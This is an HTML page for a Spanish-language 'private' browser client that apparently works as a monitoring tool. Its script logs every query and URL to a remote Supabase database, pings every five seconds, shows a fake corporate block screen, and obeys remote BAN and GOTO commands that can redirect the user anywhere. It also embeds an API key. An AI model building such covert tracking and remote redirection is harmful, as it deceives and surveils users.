<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>AlexNAV Pro | Lazarus Client</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --accent: #00d4ff; --bg: #030305; --chrome: #121215; }
        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); font-family: 'Segoe UI', sans-serif; overflow: hidden; }

        /* HEADER / BARRA DE BÚSQUEDA */
        .header { height: 70px; background: var(--chrome); display: flex; align-items: center; padding: 0 20px; gap: 15px; border-bottom: 1px solid #333; }
        .omnibox { 
            flex: 1; background: #000; border: 1.5px solid #444; color: white; 
            padding: 12px 20px; border-radius: 25px; outline: none; font-size: 14px;
        }
        .omnibox:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(0,212,255,0.2); }
        .id-badge { background: rgba(0,212,255,0.1); color: var(--accent); padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: bold; border: 1px solid var(--accent); }

        /* VIEWPORT */
        .viewport { width: 100%; height: calc(100vh - 70px); background: white; }
        iframe { width: 100%; height: 100%; border: none; }

        /* BLOQUEO ESTILO IMTGO */
        #imtgo-block {
            position: fixed; inset: 0; background: #f0f4f8; display: none;
            flex-direction: column; align-items: center; justify-content: center; z-index: 10000;
        }
        .block-card { background: white; padding: 50px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; border-top: 10px solid #2b6cb0; }
    </style>
</head>
<body>

<div id="imtgo-block">
    <div class="block-card">
        <i class="fas fa-times-circle" style="color:#e53e3e; font-size:100px; margin-bottom:20px;"></i>
        <h1 style="color:#1a365d; margin:0;">ACCESO DENEGADO</h1>
        <p style="color:#4a5568; font-size:18px;">Este sitio ha sido restringido por seguridad corporativa.</p>
    </div>
</div>

<header class="header">
    <div class="id-badge" id="display-id">ID: ...</div>
    <input type="text" id="omni" class="omnibox" placeholder="Escribe una URL o busca en la red privada...">
    <button onclick="navigate()" style="background:var(--accent); border:none; padding:10px 20px; border-radius:20px; cursor:pointer; font-weight:bold;">IR</button>
</header>

<div class="viewport">
    <iframe id="main-frame" src="https://start.duckduckgo.com"></iframe>
</div>

<script>
    const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
    const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

    // --- ID ÚNICO Y PERSISTENTE ---
    let USER_ID = localStorage.getItem('lazarus_user_id');
    if(!USER_ID) {
        USER_ID = "NODE-" + Math.floor(Math.random() * 9000 + 1000);
        localStorage.setItem('lazarus_user_id', USER_ID);
    }
    document.getElementById('display-id').innerText = "ID: " + USER_ID;

    // --- NAVEGACIÓN PRIVADA (TIPO STARTPAGE) ---
    async function navigate() {
        const query = document.getElementById('omni').value.trim();
        if(!query) return;

        // Comprobar Bloqueos
        const res = await fetch(`${SB_URL}/rest/v1/links_bloqueados?select=url`, {headers:{'apikey':SB_KEY}});
        const list = await res.json();
        if(list.some(l => query.toLowerCase().includes(l.url.toLowerCase()))) {
            document.getElementById('imtgo-block').style.display = 'flex';
            sendReport("BLOQUEO", query);
            return;
        }

        document.getElementById('imtgo-block').style.display = 'none';
        let finalUrl = "";
        
        if (query.includes('.') && !query.includes(' ')) {
            finalUrl = query.startsWith('http') ? query : 'https://' + query;
        } else {
            // Buscador Privado ( DuckDuckGo modo limpio )
            finalUrl = `https://duckduckgo.com/?q=${encodeURIComponent(query)}&kae=d&kp=-2`;
        }

        document.getElementById('main-frame').src = finalUrl;
        sendReport("NAV", finalUrl);
    }

    document.getElementById('omni').onkeypress = (e) => { if(e.key === 'Enter') navigate(); };

    // --- SISTEMA DE DETECCIÓN (HEARTBEAT) ---
    async function sendReport(action, val) {
        fetch(`${SB_URL}/rest/v1/logs`, {
            method: 'POST',
            headers: {'apikey': SB_KEY, 'Content-Type': 'application/json'},
            body: JSON.stringify({ 
                usuario_id: USER_ID, 
                accion: action, 
                contenido: val, 
                url_actual: document.getElementById('main-frame').src,
                last_seen: new Date().toISOString()
            })
        });
    }

    // Manda una señal cada 5 segundos para que el panel sepa que estás conectado
    setInterval(() => sendReport("PING", "Activo"), 5000);

    // Órdenes remotas
    setInterval(async () => {
        const res = await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${USER_ID}&activa=eq.true`, {headers:{'apikey':SB_KEY}});
        const data = await res.json();
        if(data.length > 0) {
            if(data[0].orden === 'BAN') document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%;'>DISPOSITIVO BLOQUEADO</h1>";
            if(data[0].orden === 'GOTO') document.getElementById('main-frame').src = data[0].contenido;
        }
    }, 3000);
</script>
</body>
</html>
